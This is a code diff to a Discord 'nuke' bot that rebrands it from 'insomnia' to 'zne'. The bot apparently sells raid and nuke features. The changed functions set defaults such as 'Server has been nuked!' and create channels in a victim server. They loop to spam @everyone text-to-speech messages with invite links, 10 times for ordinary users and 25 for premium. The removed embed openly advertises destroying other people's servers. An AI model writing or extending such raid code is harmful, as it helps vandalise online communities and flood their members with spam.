@@ -45,11 +45,11 @@ async def handle_set_name_setting(interaction: Interaction, setting_key: str, ne
     if setting_key != "show_username":
         if not is_premium_user(user_id):
             defaults = {
-                "channel_name": "insomnia-on-top",
-                "webhook_name": "insomnia",
+                "channel_name": "zne-on-top",
+                "webhook_name": "zne",
                 "webhook_message": "Server has been nuked!",
-                "server_name": "insomnia owns this",
-                "role_name": "join insomnia",
+                "server_name": "zne owns this",
+                "role_name": "join zne",
             }
             set_user_config(user_id, setting_key, defaults.get(setting_key, ""))
             await interaction.response.send_message(
@@ -126,33 +126,18 @@ async def log(message: str):
 
 async def create_channel_and_send_message(guild, user):
     user_config = get_user_config_for_nuke(user.id)
-    channel_name = user_config.get("channel_name", "insomnia-on-top")
-    webhook_message = user_config.get("webhook_message", "insomnia owns this")
+    channel_name = user_config.get("channel_name", "zne-on-top")
+    webhook_message = user_config.get("webhook_message", "zne owns this")
 
     try:
         ch = await guild.create_text_channel(name=channel_name)
 
-        embed = discord.Embed(
-            title="**__NUKED BY INSOMNIA__**",
-            description=(
-                "`Unfortunately this server has been nuked due to admins' inattention.`\n"
-                "### If you're interested in this bot or you need to destroy somebody's server you can [join](https://discord.gg/VSQzzAMVw3) our discord server.\n"
-                "**Insomnia has:**\n"
-                "> **Powerful bots with uptime 24/7**\n"
-                "> **Raid/Nuke features**\n"
-                "> **Good community**"
-            ),
-            color=0xb161f9
-        )
-        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1395783321895567461/1398652948812267630/11131604.png")
-
-        if webhook_message in ["insomnia owns this", "Server has been nuked!"]:
+        if webhook_message in ["zne owns this", "Server has been nuked!"]:
             is_premium = is_premium_user(user.id)
             spams = 25 if is_premium else 10
             for _ in range(spams):
                 await ch.send(
-                    content="@everyone discord.gg/VSQzzAMVw3 https://www.youtube.com/watch?v=FMwC4TtNvbI",
-                    embed=embed,
+                    content="# @everyone BEST BOTS??  - JOIN [ZNE](https://discord.gg/Y6qZ4TKRM5)",
                     tts=True
                 )
         else:
